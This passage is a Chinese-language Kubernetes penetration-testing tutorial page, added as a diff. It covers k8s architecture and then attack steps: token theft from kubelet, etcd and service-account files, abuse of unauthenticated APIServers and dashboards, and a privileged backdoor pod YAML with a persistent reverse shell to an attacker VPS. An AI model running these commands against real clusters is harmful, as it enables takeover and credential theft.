@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="zh-CN" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<title>K8s渗透入门从零到一 | My Hugo Knowledgebase</title>
+
+    <link rel="stylesheet" href="/css/main.css">
+
+
+      <script src="/js/main.js"></script>
+
+
+</head>
+<body>
+  <header>
+    <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
+  <a href="/" style="font-weight: bold; font-size: 1.2em; text-decoration: none; color: var(--text-color);">My Hugo Knowledgebase</a>
+  <button id="theme-toggle" class="theme-toggle" aria-label="Toggle Dark Mode" style="font-size: 0.9em;">
+    Theme
+  </button>
+</div>
+
+  </header>
+  <main>
+    
+  <h1>K8s渗透入门从零到一</h1>
+
+  
+  
+  <time datetime="2025-01-01T00:00:00&#43;08:00">January 1, 2025</time>
+
+  <h1 id="k8s渗透从0到1">K8s渗透从0到1</h1>
+<p>文章首发于track安全社区：<a href="https://bbs.zkaq.cn/t/32483.html">K8s渗透入门从零到一</a></p>
+<h2 id="k8s基础">k8s基础</h2>
+<h3 id="k8s架构">k8s架构</h3>
+<p>Kubernetes 又称 k8s，是 Google 在 2014 年开源的一个用来管理容器的平台</p>
+<p>k8s基本架构如下（图片的scheduler打错了，特此更正）：
+<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752397186606.png" alt="QQ_1752397186606"></p>
+<p>从上图来看可以知道，k8s主要由较少的master节点和其对应的多个Node节点组成，master节点对node及诶单进行管理控制，一个K8s集群至少要有一台master节点</p>
+<p><strong>master节点</strong>主要有以下核心组件：</p>
+<ul>
+<li>etcd 保存了整个集群的状态</li>
+<li>API Server 提供了资源操作的唯一入口，并提供认证、授权、访问控制、API 注册和发现等机制</li>
+<li>Controller Manager 负责维护集群的状态，比如故障检测、自动扩展、滚动更新等</li>
+<li>Scheduler 负责资源的调度，按照预定的调度策略将 Pod 调度到相应的机器上</li>
+</ul>
+<p><strong>node节点</strong>有以下核心组件：</p>
+<ul>
+<li>
+<p>Kubelet 负责维护容器的生命周期，同时也负责Volume（CVI）和网络（CNI）的管理，每个node节点中都存在一份</p>
+</li>
+<li>
+<p>Container Runtime 负责镜像管理以及 Pod 和容器的真正运行（CRI），早期是docker引擎作为组件，从v1.20开始使用 containerd、CRI-O 等</p>
+</li>
+<li>
+<p>Kube-proxy 负责为 Service 提供 Cluster 内部的服务发现和负载均衡</p>
+</li>
+<li>
+<p>pod 是k8s中的最小调度单位，pod内部就是容器，k8s通过操作pod来控制容器，一个node下面可以有多个pod</p>
+</li>
+<li>
+<p>fluentd不是 Kubernetes 的核心组件，但常用于日志收集，将 Pod 的 stdout/stderr 日志采集到集中系统（如 Elasticsearch、Kafka）中。</p>
+</li>
+</ul>
+<p>Pod可以说是Node节点中最核心的部分，Pod也是一个容器，它是一个”用来封装容器的容器”。一个Pod中往往会装载多个容器，这些容器共用一个虚拟环境，共享着网络和存储等资源</p>
+<p>这些容器的资源共享以及相互交互都是由pod里面的pause容器来完成的，每初始化一个pod时便会生成一个pause容器</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250713220938432.png" alt="image-20250713220938432"></p>
+<h3 id="k8s特点">k8s特点</h3>
+<p>和docker相比，docker更偏向于单机管理，而k8s则是偏向于多机集群管理，由于容器的寿命比较短暂，需要经常调试环境，而重新打包部署容器比较麻烦，又会存在一系列问题，包括但不限于网络，数据同步等，因此才有了K8S来对容器进行部署和管理</p>
+<p>k8s具有如下的特点：</p>
+<ul>
+<li>
+<p>自我修复：对容器进行监测，出现问题就在原有无问题容器基础上进行复制启动，出现问题的容器进行抛弃或重启</p>
+</li>
+<li>
+<p>弹性伸缩：容器数量的控制</p>
+</li>
+<li>
+<p>自动部署和回滚：通过配置文件进行自动的容器构建，对容器的回滚更新</p>
+</li>
+<li>
+<p>服务发现和负载均衡：默认方案</p>
+</li>
+<li>
+<p>机密和配置管理：对敏感数据或其他进行配置管理</p>
+</li>
+<li>
+<p>存储编排：虚拟磁盘与物理磁盘</p>
+</li>
+<li>
+<p>批处理：批量任务实现</p>
+</li>
+</ul>
+<h3 id="k8s工作流程">k8s工作流程</h3>
+<blockquote>
+<p>kubectl 是 k8s 的客户端工具，可以使用命令行管理集群</p>
+</blockquote>
+<p><strong>用户端命令下发通常流程如下：</strong></p>
+<ul>
+<li>kubectl向apiserver发送部署请求（例如使用 kubectl create -f deployment.yml）</li>
+<li>apiserver将 Deployment 持久化到etcd；etcd与apiserver进行一次http通信</li>
+<li>controller manager通过watch api监听 apiserver ，deployment controller看到了一个新创建的deplayment对象更后，将其从队列中拉出，根据deployment的描述创建一个ReplicaSet并将 ReplicaSet 对象返回apiserver并持久化回etcd</li>
+<li>接着scheduler调度器看到未调度的pod对象，根据调度规则选择一个可调度的节点，加载到pod描述中nodeName字段，并将pod对象返回apiserver并写入etcd</li>
+<li>kubelet在看到有pod对象中nodeName字段属于本节点，将其从队列中拉出，通过容器运行时创建pod中描述的容器</li>
+</ul>
+<hr>
+<p>接下来按照信息搜集、初始访问、执行、持久化、权限提升、横向移动的顺序来讲解k8s的攻防知识</p>
+<h2 id="0信息搜集">0.信息搜集</h2>
+<p>这一步发生在内网信息搜集的过程中，内网一般不会完全基于容器技术构建，所以内网搜集的起点一般可以分为权限受限的主机和物理主机内网</p>
+<p>k8s内部集群网络主要依靠网络插件，目前使用比较多的是Flannel和Calico</p>
+<p>而通信类型存在4种：</p>
+<ul>
+<li>同一pod内的容器间通信</li>
+<li>不同pod间的通信</li>
+<li>pod与service间的通信</li>
+<li>集群外部的流量与service间的通信</li>
+</ul>
+<h3 id="shell环境辨别">shell环境辨别</h3>
+<p>如果我们的起点是一个在k8s集群内部权限受限的容器，那么内网探测的过程依然遵循常规内网探测，可以先在搜集的时候判断当前是否是云环境，一些常用命令：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ps aux
+</span></span><span style="display:flex;"><span>ls -l .dockerenv
+</span></span><span style="display:flex;"><span>capsh --print
+</span></span><span style="display:flex;"><span>env | grep KUBE
+</span></span><span style="display:flex;"><span>ls -l /run/secrets/kubernetes.io/
+</span></span><span style="display:flex;"><span>mount
+</span></span><span style="display:flex;"><span>df -h
+</span></span><span style="display:flex;"><span>cat /proc/1/cgroup
+</span></span><span style="display:flex;"><span>cat /etc/resolv.conf
+</span></span><span style="display:flex;"><span>cat /etc/mtab
+</span></span><span style="display:flex;"><span>cat /proc/self/status
+</span></span><span style="display:flex;"><span>cat /proc/self/mounts
+</span></span><span style="display:flex;"><span>cat /proc/net/unix
+</span></span><span style="display:flex;"><span>cat /proc/1/mountinfo
+</span></span></code></pre></div><p>这里的<code>cat /proc/1/cgroup</code>是分辨容器环境一个很实用的命令：</p>
+<p>没使用 Kubernetes 的 docker 容器，其 cgroup 信息格式如下：</p>
+<pre tabindex="0"><code>12:hugetlb:/docker/9df9278580c5fc365cb5b5ee9430acc846cf6e3207df1b02b9e35dec85e86c36
+</code></pre><p>而k8s默认的cgroup信息格式如下：</p>
+<pre tabindex="0"><code>12:hugetlb:/kubepods/burstable/pod45226403-64fe-428d-a419-1cc1863c9148/e8fb379159f2836dbf990915511a398a0c6f7be1203e60135f1cbdc31b97c197
+</code></pre><h3 id="特权相关搜集">特权相关搜集</h3>
+<p>另外<code>capsh --print</code>获取到信息也较为重要，可以打印出当前容器里已有的 Capabilities 权限：
+<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1751874769526.png" alt="QQ_1751874769526"></p>
+<p>那如果没有capsh命令且无法安装怎么办呢？</p>
+<ul>
+<li>
+<p>首先<code>cat /proc/1/status</code> 获取到 Capabilities hex 记录:</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1751875341210.png" alt="QQ_1751875341210"></p>
+</li>
+<li>
+<p>然后在我们自己安装了capsh的主机上进行decode：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1751875475273.png" alt="QQ_1751875475273"></p>
+</li>
+</ul>
+<p>如此即可达到代替<code>capsh --print</code>的效果</p>
+<h3 id="apiserver相关">APIServer相关</h3>
+<p>有时候虽然获得了可以访问 APIServer 的网络权限和证书（又或者不需要证书）拥有了控制集群资源的权限，却无法下载或安装一个 kubectl 程序便捷的和 APIServer 通信，此时我们可以配置 kubectl 的 logging 登记，记录本地 kubectl 和测试 APIServer 的请求详情，并将相同的请求包发送给目标的 APIServer 以实现相同的效果</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubectl create -f cronjob.yaml -v<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>
+</span></span></code></pre></div><p>如果需要更详细的信息，也可以提高 logging level, 例如 kubectl -v=10 等，其他 Kubernetes 组件也能达到相同的目的</p>
+<h3 id="端口相关搜集">端口相关搜集</h3>
+<p>在内网信息搜集时，还可以留意一些k8s相关端口：</p>
+<ul>
+<li>kube-apiserver: 6443, 8080</li>
+<li>kubectl proxy: 8080, 8081</li>
+<li>kubelet: 10250, 10255, 4149</li>
+<li>dashboard: 30000</li>
+<li>docker api: 2375</li>
+<li>etcd: 2379, 2380</li>
+<li>kube-controller-manager: 10252</li>
+<li>kube-proxy: 10256, 31442</li>
+<li>kube-scheduler: 10251</li>
+<li>weave: 6781, 6782, 6783</li>
+<li>kubeflow-dashboard: 8080</li>
+</ul>
+<h2 id="1初始访问">1.初始访问</h2>
+<p>初始访问是攻防矩阵的第一步，可以简单理解为获取对k8s的访问权限</p>
+<h3 id="apiserver未授权">APIServer未授权</h3>
+<h4 id="insecure-port开启">insecure-port开启</h4>
+<p>典中典的k8s相关漏洞，APIServer在集群中被用于提供API来控制集群内部，如果我们能控制API Server，就意味着我们可以通过它利用kubectl创建Pod并使用磁盘挂载技术获取Node节点控制权</p>
+<p>如果目标主机将APISevrer非安全端口8080暴露出来，便可以利用此端口进行对集群的攻击：</p>
+<p>直接访问8080端口，会返回可用的API列表：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1751982848150.png" alt="QQ_1751982848150"></p>
+<p>接下来需要用到kubectl，安装教程见<a href="https://kubernetes.io/zh-cn/docs/tasks/tools/install-kubectl-linux/?spm=a2c6h.12873639.article-detail.17.27ea1f40XfNqrj#install-using-native-package-management">官网</a></p>
+<p>使用kubectl可以获取集群信息：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubectl -s <span style="color:#f92672">[</span>ip<span style="color:#f92672">]</span>:<span style="color:#f92672">[</span>port<span style="color:#f92672">]</span> get nodes
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752384616909.png" alt="QQ_1752384616909"></p>
+<p>上面这个案例可以看到有4个节点，其中有一个节点status为ready，可以成为后续执行阶段的入口点，比如利用kubectl调用该apiserver来创建恶意pod</p>
+<h4 id="secure-port开启匿名访问">secure-port开启匿名访问</h4>
+<p>即6443安全端口的未授权访问</p>
+<p>若我们不带任何凭证的访问 API server的 secure-port端口，默认会被服务器标记为<code>system:anonymous</code>用户。</p>
+<p>一般来说<code>system:anonymous</code>用户权限是很低的，但是如果运维人员管理失当，把<code>system:anonymous</code>用户绑定到了<code>cluster-admin</code>用户组，那么就意味着secure-port允许匿名用户以管理员权限向集群下达命令，这也算是变向的未授权了:</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752426203178.png" alt="QQ_1752426203178"></p>
+<p>我们可以通过kubectl进行apiserver调用：</p>
+<pre tabindex="0"><code>kubectl -s https://112.126.76.224:6443 --insecure-skip-tls-verify=true cluster-info
+</code></pre><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752426404993.png" alt="QQ_1752426404993"></p>
+<p>当然有可能会遇到这种情况：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752426467047.png" alt="QQ_1752426467047"></p>
+<p>这种时候可以使用浏览器curl去请求api接口查看响应的json都能达到类似效果：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752426612745.png" alt="QQ_1752426612745"></p>
+<p>当然有个很好用的工具叫<strong>cdk</strong>也可以实现，有个kcurl参数功能是连接K8s api-server发起自定义HTTP请求：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752426961861.png" alt="QQ_1752426961861"></p>
+<p>在匿名用户可以未授权访问6443端口的情况，，我们可以尝试访问<code>/api/v1/namespaces/default/secret</code>路由来尝试获取用户token：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1754839911396.png" alt="QQ_1754839911396"></p>
+<p>我们将这里的token字段进行base64解码后可以到到kubectl的6443安全端口进行操作，比如获取当前的权限：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubectl auth can-i --list --server<span style="color:#f92672">=</span>https://119.8.60.88:6443 --token<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;token值&gt;&#34;</span> --insecure-skip-tls-verify
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752504397042.png" alt="QQ_1752504397042"></p>
+<p>这里可以看到权限非常高</p>
+<p>打法和不安全端口8080未授权类似，这里不再细说</p>
+<h3 id="kubectl-proxy暴露">kubectl proxy暴露</h3>
+<p>通过反向代理等方式进行端口转发将原本内网的未授权api server暴露到公网</p>
+<p>所以利用方式和apiserver未授权类似，这里不再细说</p>
+<h3 id="kubelet未授权">kubelet未授权</h3>
+<p>kubelet和kubectl的区别？</p>
+<p>kubelet是在Node上用于管理本机Pod的，kubectl是用于管理集群的。kubectl向集群下达指令，Node上的kubelet收到指令后以此来管理本机Pod</p>
+<p>每个节点都有一个kubelet服务，kubelet是在每个节点上运行的主要节点代理，监听了10250、10248、10255等端口，负责管理节点上的容器与master节点的通信，而10250端口就是kubelet与API Server进行通信的主要端口</p>
+<p>如果kubeconfig文件中的配置不当，则会导致系统存在kubelet未授权访问，在该情况下，攻击者能够列出当前运行的pod，对任意pod执行命令等，实现进一步的利用</p>
+<blockquote>
+<p>例如对服务账号绑定了cluster-admin权限的pod执行命令来读取服务账号的token，然后利用高权限token控制apiserver，创建恶意pod并逃逸</p>
+</blockquote>
+<p>通过请求接口执行命令读取token：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl -XPOST -k <span style="color:#e6db74">&#34;https://</span><span style="color:#e6db74">${</span>K8S<span style="color:#e6db74">}</span><span style="color:#e6db74">:10250/run/&lt;namespace&gt;/&lt;pod&gt;/&lt;container&gt;&#34;</span> -d <span style="color:#e6db74">&#34;cmd=cat /var/run/secret/kubernetes.io/serviceaccount/token&#34;</span>
+</span></span></code></pre></div><h3 id="etcd未授权">etcd未授权</h3>
+<p>k8s使用etcd存储数据，默认监听2379端口，如果该端口暴露到公网且存在未授权访问，就可能导致信息泄漏，攻击者可以通过收集到的凭证来尝试接管集群，而由于本机可免认证访问2379端口，所以可以结合SSRF来打组合拳</p>
+<p>etcd分为v2和v3两个大版本，打法也各不相同：</p>
+<h4 id="etcd-v2">etcd v2</h4>
+<p>Kubernetes ≤ 1.5的版本默认使用etcd v2，打法一般是直接通过网页访问来获取key-value的信息：</p>
+<pre tabindex="0"><code>http://127.0.0.1:2379/v2/keys/?recursive=true
+</code></pre><p>但感觉很少遇到有用的信息：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752764813479.png" alt="QQ_1752764813479"></p>
+<h4 id="etcd-v3">etcd v3</h4>
+<p>从k8s v1.6 开始，就默认使用 etcd v3，一般使用etcdctl实现对etcd的访问</p>
+<p>比如这里我们尝试读取etcd中存储的相关信息：</p>
+<pre tabindex="0"><code>./etcdctl --endpoints=x.x.x.x:2379 get / --prefix --keys-only
+</code></pre><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1753529396622.png" alt="QQ_1753529396622"></p>
+<p>我们也可以通过匹配secrets关键字来寻找token相关信息：</p>
+<pre tabindex="0"><code>./etcdctl --endpoints=x.x.x.x:2379 get / --prefix --keys-only | grep /secrets/
+</code></pre><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1753529300887.png" alt="QQ_1753529300887"></p>
+<p>可以看到这里就有很多token信息</p>
+<p>比如我们读取bootstrap-token：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752770169058.png" alt="QQ_1752770169058"></p>
+<p>获得token后，我们可以在APIserver查看当前token权限：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>./etcdctl --token<span style="color:#f92672">=</span>&lt;token&gt; --server<span style="color:#f92672">=</span>x.x.x.x:6443 --insecure-skip-tls-verify auth can-i --list
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752769661978.png" alt="QQ_1752769661978"></p>
+<p>可见这里这个bootstrap-token的权限就比较低</p>
+<h3 id="kubeconfig文件泄漏">kubeconfig文件泄漏</h3>
+<p>kubeconfig文件是用于配制集群访问的文件，该文件用来组织有关集群、用户、命名空间和身份认证机制的信息，包括集群的apiserver地址和登录凭证，如果攻击者获取到该文件，就可以使用该凭证访问k8s集群</p>
+<p>比如node节点上就存储了kubeconfig文件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cat /root/.kube/config
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 或</span>
+</span></span><span style="display:flex;"><span>cat /etc/kubernetes/kubelet.conf
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1753639624750.png" alt="QQ_1753639624750"></p>
+<p>我们可以将config复制到我们自己的vps上，并且把这个config中server的值从本地url改为外网地址：
+<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1754241005724.png" alt="QQ_1754241005724"></p>
+<p>接下来可以通过kubect指定config文件来控制apiserver了：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubectl --kubeconfig config get pods
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250804011913966.png" alt="image-20250804011913966"></p>
+<h3 id="k8s-dashboard-未授权">K8s Dashboard 未授权</h3>
+<p>k8s Dashboard是一个基于web的k8s用户界面，可以对k8s进行可视化管理</p>
+<p>正常的k8s面板应该像这样，只允许使用bearer token登录：
+<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1754818190889.png" alt="QQ_1754818190889"></p>
+<p>或者还允许使用kubeconfig文件登录：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1754818282686.png" alt="QQ_1754818282686"></p>
+<p>但如果用户配置错误，会导致可以跳过认证阶段：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1754818442435.png" alt="QQ_1754818442435"></p>
+<p>只需要点击跳过，就能够进入dashboard的管理界面：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1754818556792.png" alt="QQ_1754818556792"></p>
+<p>但我们这样使用的其实是dashboard默认服务账户：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1754818889632.png" alt="QQ_1754818889632"></p>
+<p>该账户在默认情况下也不能达到控制集群的目的，但有些开发者会为了方便，将kubernets-dashboard账号绑定cluster-admin集群管理员角色，就这样就会使其拥有集群最高权限，那么我们就可以通过创建恶意pod来一步步接管集群：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1754819546555.png" alt="QQ_1754819546555"></p>
+<h3 id="总结">总结</h3>
+<p>可以看出，其实初始访问的入口都是配置不当导致的未授权，这些未授权存在于各个不同的端口，所以我们可以对这些端口多加留意</p>
+<h2 id="2执行">2.执行</h2>
+<p>执行阶段的主要任务是实现在集群内执行任意命令，获得shell</p>
+<h3 id="kubectl-exec进入容器">kubectl exec进入容器</h3>
+<p>当我们能够控制apiserver时，和docker类似，我们可以使用命令进入容器的shell中执行命令：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e"># apiserver未授权时</span>
+</span></span><span style="display:flex;"><span>kubectl -s x.x.x.x:8080 --namespace<span style="color:#f92672">=</span>default exec -it test-rev -- bash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 获取到kubeconfig文件时</span>
+</span></span><span style="display:flex;"><span>kubectl --kubeconfig config --namespace<span style="color:#f92672">=</span>default exec -it test-rev -- bash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 获取到高权限token时</span>
+</span></span><span style="display:flex;"><span>kubectl --server<span style="color:#f92672">=</span>https://x.x.x.x:6443 --token<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;token值&gt;&#34;</span> --insecure-skip-tls-verify --namespace<span style="color:#f92672">=</span>default exec -it test-rev -- bash
+</span></span></code></pre></div><p>比如这里进入容器执行反弹shell命令</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755101935584.png" alt="QQ_1755101935584"></p>
+<p>成功监听到反弹shell：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755101972156.png" alt="QQ_1755101972156"></p>
+<h3 id="创建后门pod">创建后门pod</h3>
+<p>获取初始访问权限后，通过创建后门pod来执行后续攻击，</p>
+<p>首先本机上新建个yaml文件用于创建容器，将节点的根目录挂载到容器的 /mnt 目录，并在容器启动后自动执行反弹shell命令，内容如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Pod</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-rev</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">nodeName</span>: <span style="color:#ae81ff">&lt;节点名称&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">containers</span>:
+</span></span><span style="display:flex;"><span>  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-container</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">ubuntu</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">command</span>: [<span style="color:#e6db74">&#34;/bin/sh&#34;</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">args</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;-c&#34;</span>
+</span></span><span style="display:flex;"><span>      - |<span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        apt update &amp;&amp; apt install -y bash netcat-openbsd &amp;&amp; \
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bash -c &#39;while true; do bash -i &gt;&amp; /dev/tcp/&lt;你的vps的公网IP&gt;/2333 0&gt;&amp;1; sleep 60; done&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">volumeMounts</span>:
+</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/mnt</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-volume</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">securityContext</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">privileged</span>: <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">volumes</span>:
+</span></span><span style="display:flex;"><span>  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-volume</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">hostPath</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/</span>
+</span></span></code></pre></div><p>然后使用 kubectl 创建文件指定的恶意容器：</p>
+<pre tabindex="0"><code>kubectl -s x.x.x.x:8080 create -f test.yaml
+</code></pre><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752337573510-20250714002417620.png" alt="QQ_1752337573510"></p>
+<blockquote>
+<p><strong>注意</strong>，这里如果想要指定在哪个node上创建容器（只有状态为ready的node可以创建并running），可以直接在yaml中增加nodeName字段：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">nodeName</span>: <span style="color:#ae81ff">&lt;节点名称&gt;</span>
+</span></span></code></pre></div><p>我们其实也可以通过上面提到的kubectl exec直接进入容器的shell：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubectl -s x.x.x.x:8080 --namespace<span style="color:#f92672">=</span>default exec -it test-rev -- bash
+</span></span></code></pre></div></blockquote>
+<p>在创建成功后，容器会自动向我们监听的vps反弹shell：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752337659881-20250714002417907.png" alt="QQ_1752337659881"></p>
+<p>因为我们将节点的根目录挂载到了容器的<code>/mnt</code>目录，所以我们可以通过操作pod的<code>/mnt</code>目录来操作node的根目录：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752337790318-20250714002609563.png" alt="QQ_1752337790318"></p>
+<h3 id="服务账号连接api-server执行指令">服务账号连接API Server执行指令</h3>
+<p>k8s的账号分为用户账号和服务账号，用户账号提供给用户来操作集群，服务账号用于pod中运行的进程，为pod中运行的应用或服务提供身份，由k8s API自动创建并由API server进行认证，k8s的pod中默认携带服务账号的访问凭证，每个服务账号均会自动关联一个API访问令牌，那么如果我们控制的pod中存在高权限的服务账号，我们就可以在pod中通过该账号凭证向k8s下发指令</p>
+<p>服务账号在pod内的默认路径如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>/var/run/secrets/kubernetes.io/serviceaccount/
+</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1755186066353.png" alt="QQ_1755186066353"></p>
+<p>我们可以携带这里的token向apiserver发送一个SelfSubjectRulesReview请求，可以知道当前服务账号在指定命名空间（这里以default为例）的操作权限：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>TOKEN<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>cat /var/run/secrets/kubernetes.io/serviceaccount/token<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>CA_CERT<span style="color:#f92672">=</span>/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+</span></span><span style="display:flex;"><span>NAMESPACE<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>cat /var/run/secrets/kubernetes.io/serviceaccount/namespace<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
